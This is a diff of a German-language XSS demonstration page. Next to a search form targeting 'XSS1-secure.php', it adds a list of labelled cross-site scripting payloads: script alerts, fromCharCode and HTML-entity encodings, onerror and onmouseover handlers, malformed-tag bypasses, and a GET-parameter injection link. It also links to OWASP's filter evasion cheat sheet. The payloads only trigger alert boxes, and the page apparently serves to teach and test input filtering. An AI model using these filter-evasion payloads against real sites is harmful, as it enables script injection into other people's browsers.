@@ -11,21 +11,63 @@
 <form method="get" rel="search" action="XSS1-secure.php" style="font-size: 50px">
     <label for="search">Suchen: </label>
     <input id="search" name="parameter" style="font-size: 50px">
-    <button type="submit"  style="font-size: 50px">Suche!</button>
+    <button type="submit" style="font-size: 50px">Suche!</button>
 </form>
+
 
 <br/>
 <a href="XSS.html">XSS</a>
-<br><br><textarea style="width: 500px; height: 300px">
+<br><br>
+<h2>Simple Example</h2>
+<textarea style="width: 100%">
     <script> alert("Sie wurden gehackt");</script>
+</textarea>
+<h2>Using CharCode</h2>
+<textarea style="width: 100%">
 
     ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
 alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
-></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 
 </textarea>
+<h2>No Quotes</h2>
+<textarea style="width: 100%">
+
+<SCRIPT>alert(String.fromCharCode(88, 83, 83))</SCRIPT>
+
+</textarea>
+<h2>On Mouseover</h2>
+<textarea style="width: 100%">
+    <p onmouseover=javascript:alert(&quot;XSS&quot;)>mouseover</p>
+</textarea>
+<h2>Attribute Value</h2>
+<textarea style="width: 100%">
+
+    <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+</textarea>
+<h2>Attribute Value</h2>
+
+<textarea style="width: 100%">
+
+    <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+</textarea>
+<h2>Attribute Value, Hex-Codes</h2>
+
+<textarea style="width: 100%">
+    <img src=x
+         onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+</textarea>
+<h2>In Tag, Escaped</h2>
+
+<textarea style="width: 100%">
+    <<SCRIPT>alert("XSS");//<</SCRIPT>
 
 
+</textarea>
+<h2>As GET-Parameter</h2>
+
+<a href='./XSS1-secure.php?parameter=<script type="text/javascript">alert("XSS")</script>'>XSS per Link</a>
+<br/>
+<br/>
 
 <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#XSS_Locator_.28short.29">mehr XSS</a>
 
